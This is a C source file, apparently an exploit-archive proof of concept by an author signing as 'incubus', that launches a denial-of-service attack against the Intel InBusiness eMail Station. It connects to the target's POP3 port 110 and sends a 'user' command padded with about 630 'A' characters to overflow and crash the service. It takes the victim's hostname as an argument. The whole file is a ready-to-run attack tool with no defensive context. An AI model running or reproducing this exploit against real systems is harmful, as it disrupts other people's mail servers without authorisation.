
    /* 
     * intel InBusiness eMail Station DoS
     * 
     * Errr... Denial Of Service against that little black intel box
     * by incubus <incubus@securax.org>
     *
     * Respect: securax, hackschool, shelloracle, tessa, kim,
     * glyc, splat, lamagra and steven.
     */ 
     
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

void usage(char *proggie){
    fprintf (stderr, "Intel InBusiness eMail Station Denial of Service\n");
    fprintf (stderr, "do %s mail.server.com\n", proggie);
    fprintf (stderr, "mail.server.com must be an InBusiness eMail Station\n\n");
    exit(-1);
    }

int main(int argc, char **argv){
    char buf[636];
    int i, sock, result;
    struct sockaddr_in 	name;
    struct hostent 	*hostinfo;
    if (argc < 2) usage(argv[0]);
    fprintf (stdout, "Intel InBusiness eMail Station Denial of Service\n");
    fprintf (stdout, "by incubus <incubus@securax.org>\n\n");
    hostinfo=gethostbyname(argv[1]);
    if (!hostinfo){ herror("Error"); exit(-1); }
    name.sin_family=AF_INET; name.sin_port=htons(110);
    name.sin_addr=*(struct in_addr *)hostinfo->h_addr;
    sock=socket(AF_INET, SOCK_STREAM, 0);
    result=connect(sock, (struct sockaddr *)&name, sizeof(struct sockaddr_in));
    if (result != 0) { herror("Oops"); exit(-1); }
    if (sock < 0){ herror("Oops"); exit(-1); }
    strncpy(buf, "user ", 5);
    for (i=0; i<630; i++) strncat(buf, "A", 1);
    send(sock, buf, sizeof(buf), 0);
    close(sock);
    fprintf (stdout, "Denial of Service done\n\n");
    close(sock);
}
